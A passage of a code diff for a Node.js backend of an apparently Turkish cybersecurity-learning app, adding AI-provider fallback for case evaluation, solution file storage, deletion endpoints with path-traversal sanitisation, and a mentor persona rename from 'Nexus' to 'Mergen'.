+                    evaluationText = response.choices[0].message.content;
+                }
+                
+                success = true; // Başarılı olursa döngüden çık
+                console.log(`${provider} ile değerlendirme başarılı.`);
+                break;
+
+            } catch (err) {
+                console.error(`${provider} ile değerlendirme hatası:`, err.message);
+                // Hata oluşursa bir sonraki sağlayıcıyı denemek için döngüye devam et
+            }
+        }
+
+        if (!success) {
+            // Eğer tüm sağlayıcılar başarısız olduysa hata döndür
+            throw new Error("Tüm AI sağlayıcıları denendi ancak değerlendirme alınamadı.");
+        }
+
+        const solutionData = {
+            caseId: safeCaseId,
+            anonymousUserId: anonymousUserId, // Kimliği de veriye ekleyelim
+            userReport: report,
+            aiEvaluation: evaluationText,
+            solvedAt: new Date().toISOString()
+        };
+
+        // Dosya adını anonymousUserId ile oluşturuyoruz
+        const solutionFilename = `solution-${safeCaseId}-${anonymousUserId}.json`;
+        
+        // 'solutions' klasörü yoksa oluştur
+        if (!fs.existsSync(solutionsDir)) {
+            fs.mkdirSync(solutionsDir);
+        }
+
+        const solutionFilePath = path.join(solutionsDir, solutionFilename);
+        await fs.promises.writeFile(solutionFilePath, JSON.stringify(solutionData, null, 2));
+        
+        console.log(`Çözüm başarıyla kaydedildi: ${solutionFilename}`);
+        // --- Değişiklik sonu ---
+
+        res.json({ evaluation: evaluationText });
+
+    } catch (error) {
+        console.error("Vaka değerlendirme hatası:", error);
+        res.status(500).json({ error: 'Değerlendirme sırasında bir sunucu hatası oluştu.' });
+    }
+});
+
+app.delete('/api/cases/:caseId', (req, res) => {
+    const { caseId } = req.params;
+
+    // --- GÜVENLİK ÖNLEMİ ---
+    // Path Traversal saldırılarını önlemek için gelen caseId'yi temizliyoruz.
+    // Bu, ../ gibi karakterlerle üst dizinlere erişilmesini engeller.
+    const safeCaseId = path.basename(caseId);
+
+    // Silinecek dosyanın tam yolunu oluşturuyoruz.
+    const caseFilePath = path.join(__dirname, 'cases', `${safeCaseId}.json`);
+
+    // Dosyanın var olup olmadığını kontrol et
+    if (!fs.existsSync(caseFilePath)) {
+        return res.status(404).json({ success: false, message: 'Silinecek vaka bulunamadı.' });
+    }
+
+    // Dosyayı sil
+    fs.unlink(caseFilePath, (err) => {
+        if (err) {
+            console.error("Vaka silinirken hata oluştu:", err);
+            return res.status(500).json({ success: false, message: 'Vaka silinirken bir sunucu hatası oluştu.' });
+        }
+
+        console.log(`Vaka başarıyla silindi: ${safeCaseId}.json`);
+        res.status(200).json({ success: true, message: 'Vaka başarıyla silindi.' });
+    });
+});
+
+app.delete('/api/solutions/:anonymousUserId', async (req, res) => {
+    const { anonymousUserId } = req.params;
+    const safeUserId = path.basename(anonymousUserId); // Güvenlik için temizleme
+    const solutionsDir = path.join(__dirname, 'solutions');
+
+    if (!fs.existsSync(solutionsDir)) {
+        return res.status(200).json({ success: true, message: 'Silinecek bir çözüm geçmişi bulunmuyor.' });
+    }
+
+    try {
+        const allFiles = await fs.promises.readdir(solutionsDir);
+        const userFiles = allFiles.filter(file => file.includes(safeUserId));
+
+        if (userFiles.length === 0) {
+            return res.status(200).json({ success: true, message: 'Bu kullanıcıya ait silinecek bir çözüm geçmişi bulunmuyor.' });
+        }
+
+        const deletePromises = userFiles.map(file => 
+            fs.promises.unlink(path.join(solutionsDir, file))
+        );
+        
+        await Promise.all(deletePromises);
+
+        console.log(`${userFiles.length} adet çözüm dosyası silindi (Kullanıcı: ${safeUserId})`);
+        res.status(200).json({ success: true, message: `${userFiles.length} adet vaka çözüm kaydı başarıyla silindi.` });
+
+    } catch (error) {
+        console.error(`Çözüm geçmişi silinirken hata oluştu (Kullanıcı: ${safeUserId}):`, error);
+        res.status(500).json({ success: false, message: 'Sunucu hatası nedeniyle geçmiş silinemedi.' });
+    }
+});
 
 // --- YENİ YARDIMCI SOHBET FONKSİYONLARI ---
 
@@ -508,7 +1156,7 @@ async function streamChatGeminiResponse(apiKey, messages, res) {
     const genAI = new GoogleGenerativeAI(apiKey);
 
     // 1. DÜZELTME: Sistem talimatını ayrı bir değişken olarak tanımlıyoruz.
-    const systemInstructionText = `You are "Nexus", an expert Cybersecurity Mentor. Your student is from Turkey and is learning to improve their technical English and cybersecurity skills. 
+    const systemInstructionText = `You are "Mergen", an expert Cybersecurity Mentor. Your student is from Turkey and is learning to improve their technical English and cybersecurity skills. 
     - Your tone must be professional, encouraging, and pedagogical. 
     - Explain complex topics with real-world examples.
     - You must primarily respond in the language the user uses. If they ask in Turkish, answer in Turkish. If they ask in English, answer in English.
@@ -551,7 +1199,7 @@ async function streamChatOpenAIResponse(apiKey, messages, res, baseURL = null) {
     
     const systemMessage = {
         role: 'system',
-        content: `You are "Nexus", an expert Cybersecurity Mentor. Your student is from Turkey and is learning to improve their technical English and cybersecurity skills. 
+        content: `You are "Mergen", an expert Cybersecurity Mentor. Your student is from Turkey and is learning to improve their technical English and cybersecurity skills. 
         - Your tone must be professional, encouraging, and pedagogical. 
         - Explain complex topics with real-world examples.
         - You must primarily respond in the language the user uses. If they ask in Turkish, answer in Turkish. If they ask in English, answer in English.
